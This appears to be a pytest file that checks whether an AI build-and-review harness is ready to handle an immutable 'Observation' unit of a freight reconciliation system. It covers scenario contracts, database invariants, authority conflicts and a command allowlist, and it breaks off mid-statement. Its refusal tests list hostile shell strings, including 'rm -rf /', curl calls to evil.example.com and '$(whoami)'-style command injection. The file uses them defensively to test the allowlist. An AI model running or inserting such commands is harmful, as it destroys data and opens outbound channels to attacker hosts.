"""Is Product Driver actually ready to BUILD, ATTACK, CORRECT and REVIEW P6/M5?

M5 is the Observation: the immutable record that a source *said* something, at a
time. It is the atom every projection in Neyma is derived from, and the place
untrusted counterparty content enters the system — so the question this file
answers is not "does the YAML parse" but whether the whole loop can own the unit
end to end without the founder standing in the middle of it.

The unit's whole character is one distinction, and every check below traces back
to it:

    immutable observation CONTENT  !=  observation-processing STATUS

`raw_value` and `content_digest` are written once. The state machine governs
processing status alone. A stale observation and a superseded observation are
both still historical truth, which is why nothing here expires one, sweeps one,
or corrects one.

Twelve questions, each answered mechanically rather than by reading a document
and agreeing with it:

1.  does the M5 base scenario parse, does it hold the pieces the generator needs
    (deterministic operation, a closed mutation axis, persisted-state oracles,
    regression anchors), and do the scenario and the task state the SAME
    contract;
2.  does the scenario measure the DATABASE rather than the probe's narration for
    the four invariants that a green test suite can state while the database
    enforces none of them;
3.  does the task preserve the three recorded authority conflicts rather than
    resolving them;
4.  does the task state F5's ORDER-TOLERANCE, which is the one place M5 must NOT
    copy M3 and M4;
5.  is the M5 command vocabulary safe, and actually visible to the generator
    rather than truncated out of the brief;
6.  can dynamic generation close an M5 coverage gap WITHOUT inventing a command,
    and is an invented one refused;
7.  is M5 scoped as `P6/M5` rather than as P6 phase completion;
8.  can accepting M5 score a P6 acceptance criterion or unlock P7 (it cannot);
9.  is an integrated independent review OWED when the repository's own authority
    says so;
10. do grounded reviewer findings return to the SAME builder, and does a
    corrected tree get a FRESH reviewer;
11. does the run stop before M6;
12. does the founder summary explain M5's product impact in simple terms — and
    never contradict its own review ledger while doing it.

Every Claude session is faked. No test here consumes Claude usage, executes the
product, or touches the real Neyma repository.
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from neyma_product_driver.completion_auditor import AuditDecision
from neyma_product_driver.config import ScenarioGenerationConfig
from neyma_product_driver.models import RunStatus
from neyma_product_driver.review_cycle import resolve_review_requirement
from neyma_product_driver.run_journal import RunJournal
from neyma_product_driver.scenario_generator import MAX_RENDERED_COMMANDS
from neyma_product_driver.scenario_plan import (
    GeneratedScenario,
    GeneratedStateCheck,
    IdentifiedRisk,
    Priority,
    RiskCategory,
    ScenarioProvenance,
)
from neyma_product_driver.scenario_planner import STAGE_COVERAGE_GAP, ScenarioPlanner
from neyma_product_driver.scenario_validation import (
    ApprovedCommands,
    ValidationContext,
    validate_plan,
)
from neyma_product_driver.scenarios import load_scenario
from neyma_product_driver.task_scope import (
    ScopeLevel,
    TaskResult,
    scoped_completion,
    standard_exclusions,
)

from scenario_fixtures import FakeFounder, ScriptedReasoner
from test_integrated_review import FakeBuilder, FakeReviewer, drive, refusing, supported
from test_scoped_completion import PhaseRepo

DRIVER_ROOT = Path(__file__).resolve().parents[1]
SCENARIOS_DIR = DRIVER_ROOT / "scenarios"
M5_PATH = SCENARIOS_DIR / "p6_m5_observation.yaml"
M5_TASK_PATH = DRIVER_ROOT / "tasks" / "neyma_p6_m5.md"
M5_TASK = M5_TASK_PATH.read_text(encoding="utf-8")
#: The same text with runs of whitespace collapsed. Prose assertions match
#: against this: the task is a wrapped markdown document, and a phrase that
#: happens to straddle a line break is not a phrase the task failed to state.
M5_TASK_FLAT = " ".join(M5_TASK.split())
PROBE = ".venv/bin/python scripts/probe_phase6_observation.py"

#: A persisted-state command the base scenario already carries, so a generated
#: case that reuses it is choosing an approved oracle rather than authoring one.
STATE_ORACLE = next(
    check.command
    for check in load_scenario(M5_PATH).expect_state
    if "schema_readiness_problems" in check.command
)

#: The canonical M5 deliverables. A different name is a scenario failure, not a
#: style preference — the permanent scenario looks for exactly these.
DELIVERABLES: tuple[str, ...] = (
    "src/freight_recon/observation.py",
    "src/freight_recon/migrations/phase6_observations.py",
    "eval/tests/test_phase6_observation.py",
    "scripts/probe_phase6_observation.py",
    "scripts/mutate_phase6_observation.py",
)

#: The seven canonical Observation states (registry §4 / M5). Not six, not eight,
#: and deliberately no `EXPIRED`, `ARCHIVED`, `DELETED` or `CORRECTED`: entity §26
#: says an Observation never expires, §28 gives it no deletion policy, and §23
#: says it is never corrected — a wrong reading is SUPERSEDED and a wrong binding
#: is corrected on M6.
STATES: tuple[str, ...] = (
    "RECEIVED",
    "PARSED",
    "BOUND",
    "UNBOUND",
    "CONFIRMED",
    "SUPERSEDED",
    "UNPARSEABLE",
)

#: States a build session might reach for out of tidiness, and that the corpus
#: says do not exist.
FORBIDDEN_STATES: tuple[str, ...] = ("EXPIRED", "ARCHIVED", "DELETED", "CORRECTED")

#: The canonical transition ids. The task must require these rows, with these
#: ids, rather than an alternative lifecycle that "achieves the same thing".
TRANSITIONS: tuple[str, ...] = ("OB-1", "OB-1c", "OB-2", "OB-2f", "OB-3", "OB-3u", "OB-4", "OB-5")

#: The four parts of the natural key. Dropping any one of them is the mutation
#: the battery has to prove is catchable.
NATURAL_KEY: tuple[str, ...] = ("tenant", "source_system", "external_id", "content_digest")

#: The seven registered F5 event contracts. `event_contracts_data.json` already
#: carries all seven, and registry.md's binding line says NO MACHINE MAY DEFINE A
#: LOCAL SYNONYM — so an eighth is defective by the registry's own definition.
F5_EVENTS: tuple[str, ...] = (
    "ObservationReceived",
    "ObservationConfirmed",
    "ObservationParsed",
    "ObservationUnparseable",
    "ObservationBound",
    "ObservationUnbound",
    "ObservationSuperseded",
)


def _local_vocabulary() -> list[str]:
    """The `--case` entries the local driver config approves, if it exists.

    Read from the file rather than through `load_config`, because this must work
    on a checkout that has no `driver.config.yaml` at all — the vocabulary is
    then simply absent and the tests that need it skip.
    """
    local = DRIVER_ROOT / "driver.config.yaml"
    if not local.exists():
        return []
    raw = yaml.safe_load(local.read_text(encoding="utf-8")) or {}
    return list((raw.get("scenario_generation") or {}).get("approved_commands") or [])


@pytest.fixture(scope="module")
def m5():
    return load_scenario(M5_PATH)


@pytest.fixture(scope="module")
def cases(m5) -> list[str]:
    """The risk families the scenario asserts the probe can exercise."""
    listing = [c for c in m5.commands if c.run == f"{PROBE} --list-cases"]
    assert listing, "--list-cases is the coverage oracle; it must run"
    return list(listing[0].expect_contains)


@pytest.fixture(scope="module")
def dimensions(m5) -> list[str]:
    listing = [c for c in m5.commands if c.run == f"{PROBE} --list-dimensions"]
    assert listing, "no mutation axis is declared; the generator can only pick a case"
    return list(listing[0].expect_contains)


@pytest.fixture(scope="module")
def state_checks(m5) -> dict[str, list[str]]:
    return {check.name: list(check.contains) for check in m5.expect_state}


# --------------------------------------------------------------------------
# 1. The base scenario, and its contract with the task
# --------------------------------------------------------------------------


class TestTheM5BaseScenario:
    def test_it_parses_and_is_a_dark_p6_backend_scenario(self, m5):
        assert m5.name == "p6_m5_observation"
        assert m5.phase == "P6"
        assert m5.mode == "backend"
        # M5 ships dark: no service, no HTTP surface, no browser, and above all
        # no importer — the product form of this unit is a RUNNING MAILBOX, and
        # the one thing that must not arrive with it is that mailbox.
        assert not m5.services and not m5.requests and m5.browser is None
        assert not m5.app_url

    def test_it_requires_the_canonical_deliverables_to_exist(self, m5):
        """A run against a repository where M5 does not exist yet must not be
        able to report a verified M5."""
        for path in DELIVERABLES:
            assert path in m5.fixtures, f"{path} is not required to exist"

    def test_the_probe_is_approved_bare_so_every_case_tail_is_reachable(self, m5):
        """The whole `--case` interface rests on this one entry.

        Approval matches by prefix, so approving the bare probe approves every
        argument tail that composes no shell. Approving only
        `probe.py --list-cases` would approve exactly that string and nothing
        else, and the generator would have no focused entry point at all.
        """
        assert any(c.run == PROBE for c in m5.commands), (
            "the bare probe invocation is missing; without it a generated "
            f"'{PROBE} --case X' is not an argument tail of any approved entry"
        )

    def test_it_asserts_a_risk_family_for_every_canonical_obligation(self, cases):
        """One family per canonical obligation, checked by name.

        This list is the contract between `tasks/neyma_p6_m5.md` and this file;
        a family missing from either is a family the generator cannot reach and
        the builder was never asked to build.
        """
        required = {
            # OB-1 — the fact, its natural key, and its immutability
            "natural-key-creates-received",
            "raw-value-is-immutable",
            "content-digest-is-immutable",
            "content-mutation-refused",
            "changed-content-is-a-new-observation",
            # OB-1c — the duplicate, which is the whole unit (M-24)
            "duplicate-is-one-row-one-confirmation-zero-work",
            "confirmation-updates-as-of-only",
            "confirmation-flood-triggers-no-work",
            # OB-2 / OB-2f — parsing and the Exception path a failure feeds
            "parse-success-parsed",
            "parse-failure-unparseable",
            "unparseable-feeds-the-exception-path",
            # OB-3 / OB-3u / OB-4 — binding, and what a binding may never be
            "deterministic-binding-bound",
            "ambiguous-binding-unbound",
            "no-candidate-binding-unbound",
            "single-weak-candidate-unbound",
            "unbound-is-human-owned",
            "unbound-resolved-by-later-deterministic-match",
            "unbound-resolved-by-owner-asserted",
            "a-guess-never-auto-binds",
            # OB-5 — supersession, and the things it is not
            "supersession-requires-rule-or-human",
            "inferrer-rerun-cannot-supersede",
            "superseded-observation-is-retained",
            "stale-observation-is-still-a-fact",
            "no-expiry-no-timer-no-sweep",
            # M-66 / M-13 — inbound content is DATA
            "inbound-content-is-data-never-instruction",
            "content-cannot-set-its-own-provenance",
            "model-inferred-cannot-be-an-observation",
            "counterparty-text-is-never-authority",
            "malformed-input-fails-closed",
            "forged-or-wrong-tenant-input-fails-closed",
            # [C-1] / entity §17 / GR-3 — tenancy, the database, concurrency
            "tenant-isolation",
            "cross-tenant-identical-natural-key",
            "unique-index-serializes-concurrent-ingest",
            "occ-on-processing-status",
            "database-invariants",
            # GR-2 / GR-4 / GR-11 / M-26 / events §8 — the P5 transport M5 rides
            "state-and-event-co-commit",
            "inbox-idempotency",
            "replay-creates-no-duplicate-and-no-effect",
            "order-tolerant-not-strict",
            "park-and-drain-unreceived-reference",
            "restart-reingest-is-idempotent",
            # the seam M5 must not overbuild into M6
            "m6-binding-seam-is-inert",
        }
        missing = sorted(required - set(cases))
        assert not missing, f"risk families the scenario never asserts exist: {missing}"

    def test_it_declares_a_bounded_mutation_axis(self, dimensions):
        """Without this the M5 possibility space is a list of fixed points.

        M5 ships dark, so there is no service and no HTTP surface, and
        `parallel_requests` — the executor's only concurrency primitive — is
        unavailable. Ordering, concurrency, timing, duplication, crash and
        redelivery variation are reachable through the probe's arguments or not
        at all. See docs/SCENARIO-SPACE.md, gap G2.
        """
        for axis in ("--concurrency", "--delay-ms", "--repeat", "--tenants",
                     "--sources", "--seed"):
            assert axis in dimensions, f"the axis {axis} is never asserted to exist"
        for fault in (
            "duplicate-ingest", "near-duplicate-ingest",
            "mutate-raw-value", "mutate-content-digest",
            "parse-failure",
            "binding-ambiguous", "binding-absent", "binding-weak",
            "model-guess-binding", "owner-asserted-binding",
            "inferrer-rerun-supersede",
            "content-sets-provenance", "content-carries-instruction",
            "counterparty-authority", "wrong-tenant", "forged-natural-key",
            "malformed-payload",
            "concurrent-ingest", "occ-conflict",
            "redeliver", "replay",
            "restart-before-parse", "restart-after-bind",
            "unreceived-reference", "reorder-stream", "stale-as-of",
        ):
            assert fault in dimensions, f"the fault {fault!r} is never asserted to exist"

    def test_the_mutation_axis_has_a_negative_control(self, m5):
        """A vocabulary that accepts anything is fuzzing in a costume."""
        negative = [c for c in m5.commands if "--inject not-a-real-fault" in c.run]
        assert negative, "nothing proves the fault vocabulary is actually closed"
        assert negative[0].expect_exit_code == 2, "a refusal must be a non-zero exit"
        assert "unknown fault" in negative[0].expect_contains
        assert "Traceback (most recent call last)" in m5.forbidden

    def test_an_expiry_fault_is_refused_because_observations_never_expire(self, m5):
        """The M5-specific negative control, and the reason it exists.

        Entity §26 says an Observation NEVER EXPIRES, §28 gives it no deletion
        policy, and machine §12 / §23 / §37 say the same three more times:
        `as_of` freshness is a checkpoint concern (M-7), not an observation
        timer. A probe that ACCEPTED an expiry fault would be producing passing
        evidence for a mechanism the corpus states does not exist — the same
        shape as M4's refused `unfreeze`.
        """
        expiry = [c for c in m5.commands if "--inject expire-observation" in c.run]
        assert expiry, "nothing refuses an observation-expiry fault"
        assert expiry[0].expect_exit_code == 2
        assert "unknown fault" in expiry[0].expect_contains

    def test_inventing_an_expiry_surface_is_a_scenario_failure(self, state_checks):
        """And the rule is preserved by a check over the corpus, not a hope.

        The way a build session breaks "an observation never expires" is not by
        arguing with it. It is by adding a retention sweep, a TTL, an
        `expires_at` column or an `ObservationExpired` event because those felt
        like hygiene.
        """
        guard = state_checks.get(
            "no observation expiry, sweep, deletion or extra transition was invented"
        )
        assert guard, "nothing asserts that no expiry surface was invented"
        assert "invented expiry surfaces: []" in guard
        assert "invented expiry/extra transition rows: []" in guard
        assert "expiry columns on observations: []" in guard

    def test_it_carries_regression_anchors_for_every_layer_m5_builds_on(self, m5):
        """M5 adds a table and edits `schema.py`, so every layer that reads a
        canonical database can be broken from inside it."""
        runs = " ".join(c.run for c in m5.commands)
        for anchor in (
            "test_phase3_witness.py",          # P3, the kernel M5 must not disturb
            "test_import_gate.py",             # P4, the boundary M5 must not widen
            "test_phase5_event_transport.py",  # P5, the transport M5 rides
            "test_phase6_work_item.py",        # M1
            "test_phase6_pipeline_instance.py",  # M2
            "test_phase6_external_effect.py",  # M3
            "test_phase6_approval.py",         # M4
        ):
            assert anchor in runs, f"{anchor} is never re-run against M5's change"
        # M5 uses seven already-registered F5 names and mints none of its own, so
        # the canonical event-contract guard is load-bearing here rather than
        # incidental: a builder that invents `ObservationExpired` fails there.
        assert "test_p5_event_contracts.py" in runs
        assert "test_p5_canonical_event_mint.py" in runs

    def test_it_re_runs_m3_and_m4_own_oracles_rather_than_trusting_m5(self, m5):
        """"M5 broke nothing" is a claim about M3's and M4's behaviour."""
        runs = [c.run for c in m5.commands]
        assert ".venv/bin/python scripts/probe_phase6_external_effect.py" in runs
        assert ".venv/bin/python scripts/probe_phase6_approval.py" in runs

    def test_the_mutation_battery_runs(self, m5):
        runs = " ".join(c.run for c in m5.commands)
        assert "mutate_phase6_observation.py" in runs
        assert "mutants caught" in m5.expect_visible

    def test_it_refuses_the_failures_m5_exists_to_prevent(self, m5):
        """Each forbidden marker is a sentence printed only when the thing M5
        exists to prevent has just happened."""
        for marker in (
            "### DUPLICATE OBSERVATION ROW ###",
            "### raw_value MUTATED ###",
            "### content_digest MUTATED ###",
            "### DUPLICATE INGEST DID WORK ###",
            "### GUESSED BINDING ACCEPTED ###",
            "### MODEL_INFERRED OBSERVATION CREATED ###",
            "### SUPERSEDED BY INFERENCE ###",
            "### PROVENANCE SET FROM CONTENT ###",
            "### INBOUND CONTENT OBEYED ###",
            "### COUNTERPARTY AUTHORITY ACCEPTED ###",
            "### CROSS-TENANT OBSERVATION ACCEPTED ###",
            "### OBSERVATION EXPIRED ###",
            "### OBSERVATION DELETED ###",
            "### UNPARSEABLE SILENTLY DROPPED ###",
            "### UNBOUND WITHOUT A HUMAN OWNER ###",
            "### DOWNSTREAM EFFECT DURING REPLAY ###",
            "### PARKED REFERENCE DROPPED ###",
        ):
            assert marker in m5.forbidden, f"{marker} is not a failure condition"

    def test_the_task_file_and_the_scenario_agree_on_the_contract(self, m5, cases, dimensions):
        """The two halves of one contract, checked against each other.

        A case the scenario asserts exists but the task never asks for is a case
        the builder is being failed on without being told. A literal the
        scenario requires but the task never states is the same defect one layer
        down.
        """
        for case in cases:
            assert case in M5_TASK, f"the scenario asserts case {case!r}; the task never names it"
        for dimension in dimensions:
            assert dimension in M5_TASK, (
                f"the scenario asserts dimension {dimension!r}; the task never names it"
            )
        for literal in m5.expect_visible:
            assert literal in M5_TASK, (
                f"the scenario requires the literal {literal!r}; the task never states it"
            )
        for marker in m5.forbidden:
            if marker.startswith("### ") and marker.endswith(" ###"):
                assert marker in M5_TASK, (
                    f"the scenario forbids {marker!r}; the task never names it"
                )
        for path in DELIVERABLES:
            assert path in M5_TASK, f"the scenario requires {path}; the task never names it"

    def test_the_task_states_the_canonical_machine_rather_than_a_generic_feature(self):
        for state in STATES:
            assert state in M5_TASK, f"the canonical state {state} is never named"
        for transition in TRANSITIONS:
            assert transition in M5_TASK, f"the canonical transition {transition} is never named"
        for part in NATURAL_KEY:
            assert part in M5_TASK, f"the natural-key part {part} is never named"
        for event in F5_EVENTS:
            assert event in M5_TASK, f"the F5 contract {event} is never named"
        assert "seven" in M5_TASK_FLAT.lower(), "the state count is never stated"
        assert "Do not add an eighth" in M5_TASK

    def test_the_task_forces_the_authority_to_be_read_first(self):
        for source in (
            "PRODUCT.md",
            "CLAUDE.md",
            "docs/implementation/CURRENT.md",
            "docs/implementation/IMPLEMENTATION-REGISTRY.yaml",
            "docs/specifications/entities/07-observation.md",
            "docs/specifications/state-machines/05-observation.machine.md",
            "docs/specifications/state-machines/registry.md",
            "docs/specifications/events/05-observation-events.md",
            "docs/specifications/events/registry.md",
        ):
            assert source in M5_TASK, f"{source} is never named as authority"
        assert "the specification wins and you say so" in M5_TASK_FLAT
        assert "REPORT THE CONFLICT" in M5_TASK

    def test_the_task_states_the_content_versus_status_distinction(self):
        """The one sentence every defect in this unit comes from confusing."""
        assert "IMMUTABLE OBSERVATION *CONTENT* IS SEPARATE FROM OBSERVATION-PROCESSING *STATUS*" in M5_TASK
        assert "PROCESSING STATUS ONLY" in M5_TASK.upper()
        assert "A **stale** observation is still historical truth" in M5_TASK
        assert "you cannot cancel that it spoke" in M5_TASK_FLAT


# --------------------------------------------------------------------------
# 2. The database is the oracle, not the probe's narration
# --------------------------------------------------------------------------


class TestPersistedStateIsTheOracle:
    """The four sentences a green test suite can state while the database
    enforces none of them.

    "the natural key is unique", "raw_value is immutable", "the human owner is
    real" and "there are seven states" are each a property of the SCHEMA. A
    probe that prints them proves it printed them.
    """

    def test_the_scenario_reads_the_database_at_all(self, m5):
        assert m5.expect_state, "no persisted state is inspected; the probe speaks for itself"

    def test_the_natural_key_is_asserted_as_a_unique_index(self, state_checks):
        guard = state_checks.get("the natural key is a UNIQUE index over all four of its parts")
        assert guard, "nothing asserts the natural key is an index"
        assert "CREATE UNIQUE INDEX" in guard
        for part in ("source_system", "external_id", "content_digest"):
            assert part in guard, f"the index is not asserted to cover {part}"

    def test_immutability_is_asserted_as_a_trigger(self, state_checks):
        """`raw_value` immutable with no trigger behind it is a comment.

        The repository already builds invariants this way —
        `trg_checkpoint_witnesses_append_only_update`,
        `trg_durable_timers_immutable`, `trg_event_outbox_envelope_immutable`,
        `trg_pending_references_immutable` — so this is its own mechanism, not a
        bar invented here.

        `content_digest` is asserted beside `raw_value` because the digest is
        HALF THE IDENTITY of the row: a digest that can be rewritten is a
        natural key that can be rewritten, and then the uniqueness index above
        is protecting nothing.
        """
        guard = state_checks.get("the fact is immutable in the database, not merely in the Python")
        assert guard, "nothing asserts the fact is immutable in the database"
        assert "raw_value protected by a trigger: True" in guard
        assert "content_digest protected by a trigger: True" in guard

    def test_the_seven_states_are_asserted_and_there_is_no_eighth(self, m5):
        guard = [c for c in m5.expect_state if "state vocabulary" in c.command]
        assert guard, "the state set is never read out of the DDL"
        declared = guard[0]
        for state in STATES:
            assert f"'{state}'" in declared.contains, f"{state} is not asserted in the CHECK"
        for forbidden in FORBIDDEN_STATES:
            assert f"'{forbidden}'" in declared.not_contains, (
                f"nothing prevents an invented {forbidden} state"
            )

    def test_the_human_owner_is_asserted_as_a_foreign_key(self, state_checks):
        """"Human-owned" is decoration while the owner column is text.

        Machine §5: the owner is "system; a human once `UNBOUND`/`UNPARSEABLE`".
        A FOREIGN KEY into `tenant_humans` is the version of that sentence a
        database enforces — exactly the argument M1 made for `owner_id` and M4
        made for `granted_by`.
        """
        guard = state_checks.get(
            "an unbound or unparseable observation's human owner is a FOREIGN KEY, "
            "not a convention"
        )
        assert guard, "nothing asserts the human owner is a foreign key"
        assert "tenant_humans" in guard

    def test_the_dark_posture_is_measured_over_the_shipped_package(self, state_checks):
        assert (
            "production importers of observation: []"
            in state_checks.get(
                "M5 has no production caller — the dark posture, measured over the shipped package",
                [],
            )
        )
        assert (
            "scripts reaching observation: ['probe_phase6_observation.py']"
            in state_checks.get(
                "the only thing outside the package that reaches M5 is the verification probe itself",
                [],
            )
        )

    def test_no_live_importer_can_arrive_with_the_unit(self, m5, state_checks):
        """M5's product form is a running mailbox. That is the thing that must
        not arrive with it."""
        guard = state_checks.get(
            "no live importer: nothing joins the observation machine to an inbound "
            "or outbound channel"
        )
        assert guard, "nothing prevents a live importer arriving with M5"
        assert "modules joining observation to a channel: []" in guard
        command = [c for c in m5.expect_state if c.contains == guard][0].command
        for channel in ("ingestion", "email_adapter", "imap_mailbox", "browser_use_adapter",
                        "tms_adapter", "slack_adapter"):
            assert channel in command, f"the importer sweep does not look at {channel}"

    def test_m5_authorizes_nothing(self, state_checks):
        """Entity §35: an Observation may EVIDENCE a claim; it can never MAKE
        one, activate a policy, or authorize an effect."""
        guard = state_checks.get("the checkpoint is still the only thing that mints a gate decision")
        assert guard
        assert "modules that MINT a gate decision: ['checkpoint.py']" in guard

    def test_the_seven_f5_contracts_are_used_and_no_eighth_is_minted(self, state_checks):
        guard = state_checks.get("M5 emits the seven registered F5 events and invents no eighth")
        assert guard, "nothing checks the event names M5 uses against the canonical registry"
        for event in F5_EVENTS:
            assert f"'{event}'" in guard, f"{event} is not asserted registered"
        assert "unregistered Observation* names in the machine: []" in guard

    def test_m9_and_m6_are_not_invented_along_the_way(self, state_checks):
        """`OB-2f` and `OB-3u` both end "-> Exception", and the cheapest way to
        satisfy that sentence is to build M9."""
        guard = state_checks.get("the Exception path is fed without M9 being invented")
        assert guard, "nothing prevents M5 building another unit's machine"
        assert "mints another machine event: []" in guard
        assert "m9/m6 tables created by m5: []" in guard


# --------------------------------------------------------------------------
# 3. The three recorded authority conflicts stay open
# --------------------------------------------------------------------------


class TestTheTaskPreservesTheAuthorityConflicts:
    """M4's §3.9 lesson, applied to a corpus that disagrees with itself three
    times about M5.

    A resolution the builder invented is worse than a blocked run, because it
    looks like agreement.
    """

    def test_all_three_questions_are_named_with_both_sides(self):
        for question in ("M5-AQ-1", "M5-AQ-2", "M5-AQ-3"):
            assert question in M5_TASK, f"{question} is never raised"
        # AQ-1: BOUND classified terminal, and BOUND -> SUPERSEDED enumerated.
        assert "is `BOUND` terminal?" in M5_TASK
        assert "OB-5" in M5_TASK
        # AQ-2: machine §8 and machine §9 contradict each other in one file.
        assert "is `UNPARSEABLE` terminal or non-terminal human-owned?" in M5_TASK
        assert "contradict **each other**" in M5_TASK
        # AQ-3: OB-1c's From->To column against its Writes column.
        assert "what does a duplicate do to a row that has already advanced?" in M5_TASK

    def test_each_question_names_what_every_reading_agrees_on(self):
        """The builder is not blocked by the conflict. It is blocked from
        RESOLVING it — and told exactly what it may still build."""
        assert M5_TASK.count("Every reading agrees on:") == 3
        assert "Do not \"fix\" the classification in either direction." in M5_TASK
        assert "Do not amend a specification to close it." in M5_TASK

    def test_the_scenario_asserts_nothing_about_the_open_questions(self, m5):
        """The scenario must not encode a resolution either.

        There is no required literal about whether `BOUND` or `UNPARSEABLE` is
        terminal, and none about what a duplicate does to an already-advanced
        row.
        """
        visible = " ".join(m5.expect_visible).upper()
        assert "TERMINAL" not in visible, (
            "the scenario requires a literal about terminality, which the corpus does "
            "not settle"
        )
        # What it DOES require is the part every reading agrees on.
        assert "ONE ROW, ONE CONFIRMATION, ZERO WORK" in m5.expect_visible
        assert "THE SUPERSEDED OBSERVATION IS RETAINED, IT WAS TRUE WHEN MADE" in m5.expect_visible

    def test_the_provenance_scoping_decision_is_stated_not_guessed(self):
        """The refusal is mandatory; the F14 emission is P7's.

        `CURRENT.md` scopes `ProvenanceStrengtheningAttempted`'s emission half to
        Implementation Phase 7 by name, while `events/14-audit-security-events.md`
        names M5/M6 as its producer. The task must give the builder both halves
        and a stop instruction, not a guess.
        """
        assert "ProvenanceStrengtheningAttempted" in M5_TASK
        assert "the refusal is MANDATORY" in M5_TASK
        assert "the F14 emission is NOT yours" in M5_TASK


# --------------------------------------------------------------------------
# 4. F5 is order-tolerant — the one place M5 must NOT copy M3 and M4
# --------------------------------------------------------------------------


class TestF5IsOrderTolerant:
    """`events/registry.md` §8 lists the strict-order aggregates by name — F2,
    F3, F4, F11, F13 — and lists F5 Observation as ORDER-TOLERANT.

    M3 and M4 each inherited a strict-order obligation and discharged it, so the
    obvious thing for an M5 builder to do is inherit it again. That would be
    inventing a guarantee canon did not ask for, and §8's own rule makes it
    actively wrong: an event declaring no predecessor "falls back to contiguity",
    so declaring one falsely is not a harmless extra.
    """

    def test_the_task_states_the_classification_and_the_prohibition(self):
        assert "ORDER-TOLERANT" in M5_TASK
        assert "do NOT declare `previous_aggregate_version` on F5 events" in M5_TASK_FLAT
        assert "F2 Pipeline, F3 Effect/Grant, F4 Approval, F11 Policy, F13 Brake" in M5_TASK_FLAT

    def test_the_task_still_carries_the_parking_obligation_m5_does_inherit(self):
        """Order-tolerance retires the predecessor chain, not M-26."""
        assert "M-26" in M5_TASK
        assert "PARKED" in M5_TASK
        assert "drain_handler_for" in M5_TASK
        assert "park-and-drain-unreceived-reference" in M5_TASK

    def test_the_scenario_makes_order_tolerance_observable(self, m5, cases):
        assert "order-tolerant-not-strict" in cases
        assert "F5 IS ORDER-TOLERANT: NO STRICT-ORDER PREDECESSOR IS DECLARED" in m5.expect_visible
        assert "A REFERENCE TO AN UNRECEIVED OBSERVATION IS PARKED, NOT DROPPED" in m5.expect_visible
        assert "A PARKED REFERENCE DRAINS WHEN THE OBSERVATION ARRIVES" in m5.expect_visible


# --------------------------------------------------------------------------
# 5. The vocabulary is safe, and visible to the generator
# --------------------------------------------------------------------------


class TestTheM5Vocabulary:
    @pytest.fixture
    def approved(self):
        return ApprovedCommands.from_sources(
            scenarios=[load_scenario(p) for p in sorted(SCENARIOS_DIR.glob("*.y*ml"))],
            configured=_local_vocabulary(),
        )

    def _planner(self, tmp_path: Path, configured: list[str]) -> ScenarioPlanner:
        return ScenarioPlanner(
            repo=tmp_path,
            config=ScenarioGenerationConfig(enabled=True, approved_commands=configured),
            reasoner=ScriptedReasoner([{"risks": [], "scenarios": []}]),
            base_scenario=load_scenario(M5_PATH),
            permanent_scenarios=[load_scenario(p) for p in sorted(SCENARIOS_DIR.glob("*.y*ml"))],
            founder=FakeFounder(),
        )

    def test_every_case_is_approved_by_the_bare_probe_alone(self, tmp_path, cases):
        """No enumeration needed for SAFETY — only for visibility."""
        planner = self._planner(tmp_path, [])
        for case in cases:
            ok, why = planner.approved_commands.approves(f"{PROBE} --case {case}")
            assert ok, f"{case}: {why}"

    def test_the_whole_mutation_axis_composes_without_widening_the_boundary(
        self, approved, dimensions
    ):
        """The property that makes the mutation axis safe rather than clever.

        Approval matches by PREFIX and refuses shell composition in the tail, so
        every combination of dimensions is already permitted by the single bare
        probe entry — the axis buys the generator a large bounded space and buys
        the boundary nothing to defend.
        """
        for fault in [d for d in dimensions if not d.startswith("--")]:
            command = (
                f"{PROBE} --case duplicate-is-one-row-one-confirmation-zero-work "
                f"--inject {fault} --concurrency 8 --delay-ms 5000 --repeat 5 "
                "--tenants 3 --sources 4 --seed 4211"
            )
            ok, why = approved.approves(command)
            assert ok, f"{fault}: {why}"

    @pytest.mark.parametrize(
        "command",
        [
            # A command nobody wrote down.
            "curl https://api.example.com/observations",
            ".venv/bin/python scripts/send_real_invoice.py",
            "rm -rf src/freight_recon",
            # A live importer, which is precisely what M5 must not grow.
            ".venv/bin/python -m freight_recon.imap_mailbox --poll",
            ".venv/bin/python scripts/slack_probe.py --post-observation",
            # The approved probe, extended with composition.
            f"{PROBE} --case raw-value-is-immutable; curl https://evil.example.com",
            f"{PROBE} --case raw-value-is-immutable && rm -rf /",
            f"{PROBE} | tee /tmp/out",
            f"{PROBE} > /etc/hosts",
            f"{PROBE} --case $(whoami)",
            f"{PROBE} --case `whoami`",
            # A newline is whitespace; normalization would hide it, so the raw
            # string is scanned for control characters first.
            f"{PROBE}\ncurl https://evil.example.com",
            # A prefix that is not a prefix.
            ".venv/bin/python scripts/probe_phase6_observation.py.bak",
        ],
    )
    def test_a_command_outside_the_vocabulary_is_refused(self, approved, command):
        ok, why = approved.approves(command)
        assert not ok, f"escaped the approved set: {command!r}"
        assert why, "a refusal must say why"

    def test_a_dimension_value_carrying_shell_is_still_refused(self, approved):
        """The axis is argument-only. A flag is not a hole."""
        for hostile in ("$(id)", "`id`", "a;id", "a|id", "a>/etc/hosts", "a&&id"):
            ok, _ = approved.approves(f"{PROBE} --case tenant-isolation --inject {hostile}")
            assert not ok, f"a dimension value smuggled shell through: {hostile!r}"

    def test_the_probe_with_an_ordinary_case_tail_is_still_allowed(self, approved):
        """The boundary has to let the real vocabulary through, or it has only
        made generation useless rather than safe."""
        ok, why = approved.approves(f"{PROBE} --case supersession-requires-rule-or-human")
        assert ok, why

    def test_m3_and_m4_probes_stay_reachable_through_the_scenario(self, approved):
        """They are not enumerated in the config, and they do not need to be.

        M5 co-commits with neither — it adds a table and edits the canonical
        schema, which is a REGRESSION relationship, not a seam. Writing their
        bare probes into `p6_m5_observation.yaml` as regression anchors already
        approves every `--case` tail of both, because approval matches by prefix.
        """
        for command in (
            ".venv/bin/python scripts/probe_phase6_external_effect.py --case tenant-isolation",
            ".venv/bin/python scripts/probe_phase6_approval.py --case tenant-isolation",
        ):
            ok, why = approved.approves(command)
            assert ok, f"{command}: {why}"

    def test_the_rendered_brief_actually_shows_the_m5_vocabulary(self, tmp_path):
        """The brief truncates the approved list, silently. A vocabulary the
        generator never sees is a vocabulary it cannot choose from."""
        vocabulary = _local_vocabulary()
        if not any("probe_phase6_observation.py" in entry for entry in vocabulary):
            pytest.skip("no local driver.config.yaml enumerating the M5 vocabulary")

        planner = self._planner(tmp_path, vocabulary)
        planner.plan_initial(task="Build P6/M5 Observation", unit=None, run_id="r-m5")
        brief = planner.reasoner.briefs[0].render()

        assert PROBE in brief, "the deterministic M5 entry point is not in the brief"
        missing = [
            entry.split("--case ", 1)[1].split()[0]
